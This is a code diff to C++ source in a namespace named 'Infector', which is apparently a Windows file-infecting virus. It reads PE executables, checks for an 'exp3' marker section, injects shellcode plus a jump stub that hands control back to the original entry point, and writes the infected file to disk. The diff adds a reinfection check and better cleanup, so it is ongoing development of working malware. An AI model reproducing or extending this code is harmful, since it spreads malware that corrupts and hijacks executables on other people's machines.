@@ -39,16 +39,6 @@ namespace Infector
         if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
             CloseHandle(hFile);
 
-        if (!succeed)
-        {
-            *bufferSize = 0;
-            if (*buffer != NULL)
-            {
-                custom_std::free(*buffer);
-            }
-
-        }
-
         return succeed;
     }
 
@@ -152,6 +142,29 @@ namespace Infector
 
         }
 
+    }
+
+    bool IsExecutableInfected(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
+    {
+        ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(*buffer);
+
+        PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);
+
+        PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);
+
+        PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);
+
+        for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
+        {
+            if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
+            {
+                return true;
+            }
+
+            pCurrentSection++;
+        }
+
+        return false;
     }
 
     bool InfectExecutable(
@@ -283,16 +296,15 @@ namespace Infector
         return true;
     }
 
-
     bool InfectFile(const wchar_t* path)
     {
-        void* executableBuffer;
+        void* executableBuffer = NULL;
         unsigned long executableBufferSize;
 
-        void* infectedExecutableBuffer;
+        void* infectedExecutableBuffer = NULL;
         unsigned long infectedExecutableBufferSize;
 
-        void* sectionData;
+        void* sectionData = NULL;
         unsigned long sectionDataSize;
 
         unsigned char sectionName[] = { 'e', 'x', 'p', '3', '\x00' };
@@ -304,30 +316,51 @@ namespace Infector
         shellcodeJumper[sizeof(DWORD) + 2] = 0x58; // POP EAX - TO REARENGE THE STACK FRAME BACK
         shellcodeJumper[sizeof(DWORD) + 3] = 0xE9; // JMP REL
         *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 4]) = 0x89ABCDEF; // Relative address of old main function
-
-        if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
+        
+        bool succeed = false;
+        do
         {
-            return false;
-        }
+            if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
+            {
+                break;
+            }
 
-        // don't forget to do cleanup after
-        if (!GetFileData(path, &executableBuffer, &executableBufferSize))
-        {
-            return false;
-        }
+            // don't forget to do cleanup after
+            if (!GetFileData(path, &executableBuffer, &executableBufferSize))
+            {
+                break;
+            }
 
-        if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
-        {
-            return false;
-        }
+            if (IsExecutableInfected(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &executableBuffer, &executableBufferSize))
+            {
+                break;
+            }
 
-        if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
-        {
-            return false;
-        }
+            if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
+            {
+                break;
+            }
+
+            if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
+            {
+                break;
+            }
+
+            succeed = true;
+
+        } while (false);
+
+        if (executableBuffer != NULL)
+            custom_std::free(executableBuffer);
+
+        if (infectedExecutableBuffer != NULL)
+            custom_std::free(infectedExecutableBuffer);
+
+        if (sectionData != NULL)
+            custom_std::free(sectionData);
 
 
-        return true;
+        return succeed;
     }
 
 }
